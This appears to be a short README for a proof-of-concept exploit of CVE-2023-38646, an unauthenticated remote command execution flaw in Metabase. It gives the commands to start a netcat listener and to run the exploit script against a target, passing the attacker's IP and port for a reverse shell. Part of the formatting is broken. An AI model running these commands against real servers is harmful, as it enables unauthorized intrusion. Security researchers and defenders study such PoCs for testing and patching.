# CVE-2023-38646 PoC

## Description

This is a Proof of Concept (PoC) script for exploiting Metabase, an open-source business intelligence and data analytics tool. Metabase allows users to visualize and interact with their data, making it a powerful platform for data analysis.

This vulnerability, designated as CVE-2023-38646, allowed attackers to execute arbitrary commands on the server without requiring any authentication. The impact of this flaw was severe, as it granted unauthorized access to the server at the server's privilege level.

nc -nlvp chosen-port
```

**Run the Script**

```bash
python3 exploit.py -u http://target-metabase-server -i your-ip-address -p chosen-port
